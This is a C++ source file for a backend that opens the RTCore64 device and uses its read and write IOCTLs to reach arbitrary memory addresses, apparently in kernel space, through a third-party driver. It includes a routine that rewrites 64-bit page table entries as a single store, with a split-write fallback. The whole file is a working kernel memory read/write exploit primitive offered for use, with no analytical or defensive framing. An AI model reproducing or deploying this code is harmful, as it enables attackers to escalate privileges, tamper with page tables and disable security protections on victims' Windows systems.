#include "RTCore64Backend.h"

struct RTCORE64_MEMORY_OP {
    BYTE    Pad0[8];
    DWORD64 Address;
    BYTE    Pad1[8];
    DWORD   Size;
    DWORD   Value;
    BYTE    Pad2[16];
};
static_assert(sizeof(RTCORE64_MEMORY_OP) == 48, "");

bool RTCore64Backend::Open() {
    hDev = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE,
        0, nullptr, OPEN_EXISTING, 0, nullptr);
    return hDev != INVALID_HANDLE_VALUE;
}

void RTCore64Backend::Close() {
    if (hDev != INVALID_HANDLE_VALUE) { CloseHandle(hDev); hDev = INVALID_HANDLE_VALUE; }
}

DWORD RTCore64Backend::ReadPrim(DWORD64 addr, DWORD size) {
    RTCORE64_MEMORY_OP op{};
    op.Address = addr;
    op.Size    = size;
    DWORD n;
    DeviceIoControl(hDev, IOCTL_READ, &op, sizeof(op), &op, sizeof(op), &n, nullptr);
    return op.Value;
}

void RTCore64Backend::WritePrim(DWORD64 addr, DWORD size, DWORD value) {
    RTCORE64_MEMORY_OP op{};
    op.Address = addr;
    op.Size    = size;
    op.Value   = value;
    DWORD n;
    DeviceIoControl(hDev, IOCTL_WRITE, &op, sizeof(op), &op, sizeof(op), &n, nullptr);
}

bool RTCore64Backend::Wr64Atomic(DWORD64 addr, DWORD64 value) {
    // RTCore64's RTCORE64_MEMORY_OP layout (48 bytes total):
    //   +0  Pad0[8]
    //   +8  Address (QWORD)
    //   +16 Pad1[8]
    //   +24 Size    (DWORD)
    //   +28 Value   (DWORD)  ← lo32 lives here
    //   +32 Pad2[16]         ← hi32 lives in Pad2[0..3]
    //
    // If the kernel handler does *(QWORD*)address = *(QWORD*)&op->Value for Size=8,
    // bytes [28..35] form a naturally-aligned QWORD = lo | (hi<<32).
    // A single MOV QWORD to an 8-byte-aligned PTE address is CPU-atomic on x86-64
    // (Intel SDM Vol.3A §8.2.3.1 — aligned single-copy atomic writes up to native width).
    //
    // We use a re-typed struct to avoid aliasing UB when writing Pad2[0..3].
    struct Op48 {
        BYTE    Pad0[8];
        DWORD64 Address;
        BYTE    Pad1[8];
        DWORD   Size;
        DWORD   ValueLo;   // offset 28 — overlaps original Value
        DWORD   ValueHi;   // offset 32 — overlaps original Pad2[0..3]
        BYTE    Pad2b[12]; // remaining pad (original Pad2[4..15])
    };
    static_assert(sizeof(Op48) == 48, "Op48 size mismatch");

    Op48 op{};
    op.Address = addr;
    op.Size    = 8;
    op.ValueLo = (DWORD)(value & 0xFFFFFFFF);
    op.ValueHi = (DWORD)(value >> 32);

    DWORD n;
    BOOL ok = DeviceIoControl(hDev, IOCTL_WRITE,
                              &op, sizeof(op), &op, sizeof(op), &n, nullptr);
    if (ok) return true;  // driver handled Size=8 → single QWORD store → atomic

    // Driver returned error (Size=8 unsupported) — fall back to hi→lo pair.
    // hi written first keeps Present=1 throughout; brief PA-inconsistency is
    // far safer than the Present=0 window that the old 3-step approach created.
    WritePrim(addr + 4, 4, (DWORD)(value >> 32));
    WritePrim(addr,     4, (DWORD)(value & 0xFFFFFFFF));
    return false;
}
